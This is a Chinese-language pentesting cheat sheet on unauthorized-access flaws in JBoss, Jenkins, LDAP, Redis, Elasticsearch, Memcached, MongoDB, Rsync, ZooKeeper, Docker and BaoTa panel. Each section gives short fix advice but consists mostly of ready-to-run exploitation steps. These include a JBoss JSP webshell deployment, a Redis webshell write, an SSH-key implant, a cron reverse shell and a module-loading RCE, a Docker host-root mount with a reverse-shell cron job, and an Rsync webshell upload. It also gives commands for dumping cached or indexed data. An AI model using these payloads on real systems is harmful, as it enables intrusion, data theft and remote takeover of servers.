- Jboss 未授权访问
- Jenkins 未授权访问
- ldap未授权访问
- Redis未授权访问
- elasticsearch未授权访问
- MenCache未授权访问
- Mongodb未授权访问
- Rsync未授权访问
- Zookeeper未授权访问
- Docker未授权访问

#### JBOSS 未授权访问漏洞

默认情况下访问 [http://ip:](http://ip/)**8080**/jmx-console 就可以浏览 jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患

 影响范围JBOSS 全版本

1、写入一句话木马：

```
http://127.0.0.1:8080/jmx-console//HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=August.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True

```

2、写入1.txt文件

```
http://127.0.0.1:8080/August/shell.jsp?f=1.txt&t=hello world!

```

3、访问1.txt文件

```
http://127.0.0.1:8080/August/1.txt
```

##### 检测方法

先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 [http://ip:jboss](http://ip/)端口/ 看是否能进入 jmx-console 和 web-console 

##### 修复方法

关闭jmx-console和web-console，提高安全性

#### Jenkins 未授权访问

漏洞原因：未设置密码，导致未授权访问。

漏洞测试：直接通过url访问

```http
http://<target>:8080/manage
http://<target>:8080/script
```

修复建议：设置强口令密码

#### ldap未授权访问

漏洞原因：没有对Ldap进行密码验证，导致未授权访问

检测脚本：

```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_

from ldap3 import Connection,Server,ALL
def ldap_anonymous(ip):
    try:
        server = Server(ip,get_info=ALL,connect_timeout=1)
        conn = Connection(server, auto_bind=True)
        print "[+] ldap login for anonymous"
        conn.closed
    except:
        #pass
        print '[-] checking for ldap anonymous fail'
```

利用工具：使用LdapBrowser直接连入，获取敏感信息。

修复建议：增加强密码验证

##### Redis未授权访问

##### 姿势一：绝对路径写webshell（权限低）

我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件：

```
config set dir /home/wwwroot/default/
config set dbfilename redis.php
set webshell "<?php phpinfo(); ?>"
save

```

##### 姿势二：写入ssh-key公钥获取root权限（权限高）

1、ssh免密码配置

```
ssh-keygen -t rsa -P ''     #生成公钥/私钥对                           
cd /root/.ssh/
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt  #将公钥写入 foo.txt 文件
连接 Redis 写入文件

```

2、连接Redis写入文件

```
cat foo.txt | ./redis-cli -h 192.168.125.140  -x set crackit
./redis-cli -h 192.168.125.140
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save

```

利用私钥成功登录redis服务器

##### 姿势三：利用contrab计划任务反弹shell

~~~
config set dir /var/spool/cron/crontabs/
config set dbfilename root
flushall
set test "* * * * * /bin/bash -i >& /dev/tcp/10.1.1.211:1234 0>&1"
save
~~~

##### 姿势四：主从复制RCE

在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。

通过脚本实现一键自动化getshell：

1、生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make
```

2、攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so

```
git clone https://github.com/Ridter/redis-rce.git
cd redis-rce/
cp ../RedisModules-ExecuteCommand/src/module.so ./
pip install -r requirements.txt 
python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
```

#### Elasticsearch未授权访问

漏洞原因：Elasticsearch 默认端口为9200 ，攻击者可以直接访问http://ip:port

~~~python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import requests
def Elasticsearch_check(ip, port=9200, timeout=5):
    try:
    　　url = "http://"+ip+":"+str(port)+"/_cat"
    　　response = requests.get(url) 
    except:
    　　pass
    if "/_cat/master" in response.content:
    　　print '[+] Elasticsearch Unauthorized: ' +ip+':'+str(port)
~~~

漏洞测试：

```
http://localhost:9200/_cat/indices
http://localhost:9200/_river/_search 查看数据库敏感信息
http://localhost:9200/_nodes 查看节点数据

如有安装head插件：
http://localhost:9200/_plugin/head/ web管理界面
```

修复建议：

1、限制IP访问，绑定固定IP

2、在config/elasticsearch.yml中为9200端口设置认证：

```
　　http.basic.enabled true #开关，开启会接管全部HTTP连接
　　http.basic.user "admin" #账号
　　http.basic.password "admin_pw" #密码
　　http.basic.ipwhitelist ["localhost", "127.0.0.1"]
```

#### MenCache未授权访问

漏洞原因：Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。

检测脚本：

```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
def Memcache_check(ip, port=11211, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("stats\r\n")
        result = s.recv(1024)
        if "STAT version" in result:
            print '[+] Memcache Unauthorized: ' +ip+':'+str(port)
    except Exception, e:
        pass

```

漏洞验证：

```python
#无需用户名密码，可以直接连接memcache 服务的11211端口。
telnet x.x.x.x  11211

stats  //查看memcache 服务状态
stats items  //查看所有items
stats cachedump 32 0  //获得缓存key
get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露

```

修复建议：绑定的ip地址为 127.0.0.1，或者通过firewall限制访问。

#### Mongodb未授权访问

漏洞原因：MongoDB 默认是没有权限验证的，登录的用户可以通过默认端口无需密码对数据库任意操作(增删改高危动作)，而且可以远程访问数据库。

检测脚本：

```
#! /usr/bin/env python
# _*_  coding:utf-8 _*_

def mongodb(ip,port):    
    try:
        client = MongoClient(ip,port)
        db=client.local
        flag = db.collection_names()
        if flag:    
            print "[+] Mongodb login for anonymous"
    except Exception, e:
        pass

```

修复建议：增加用户密码权限验证，设置本地监听或者访问控制。

#### Rsync未授权访问

漏洞原因：未配置账号密码认证，导致未授权访问。

漏洞测试：

```
列举整个同步目录或指定目录：
rsync 10.0.0.12 ::
rsync 10.0.0.12 :: www /

下载文件或目录到本地：
rsync – avz 10.0.0.12 :: WWW/  /var/tmp
rsync – avz 10.0.0.12 :: www/  /var/tmp

上传本地文件到服务端：
rsync -avz webshell 10.0.0.12 :: WWW /

```

修复建议：增加用户密码认证，设置访问ip限制。

#### Zookeeper未授权访问

漏洞原因：ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。

漏洞测试：echo envi|nc 192.168.15.74 2181

![img](https://www.cnblogs.com/xiaozi/p/image/20200722-05.png)

![img](https://img2020.cnblogs.com/blog/894761/202007/894761-20200723233213497-1451687566.png)

修复建议：添加用户名密码认证，设置ip访问控制。

#### Docker未授权访问

漏洞原因：docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。

```
sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375

```

漏洞利用：

通过docker daemon api 执行docker命令。

```
#列出容器信息，效果与docker ps一致。 
curl http://<target>:2375/containers/json 

#启动容器
docker -H tcp://<target>:2375 ps -a

```

1、新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。

```
sudo docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash

```

2、在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

```
echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1' >> /mnt/var/spool/cron/crontabs/root

```

3、本地监听端口，获取对方宿主机shell。

###### 宝塔面板

(Linux)、7.5.13(Linux)版本的宝塔面板存在未授权访问phpmyAdmin的漏洞，通过访问`ip:888/pma`则可无需任何登录操作直接进入phpmyAdmin



















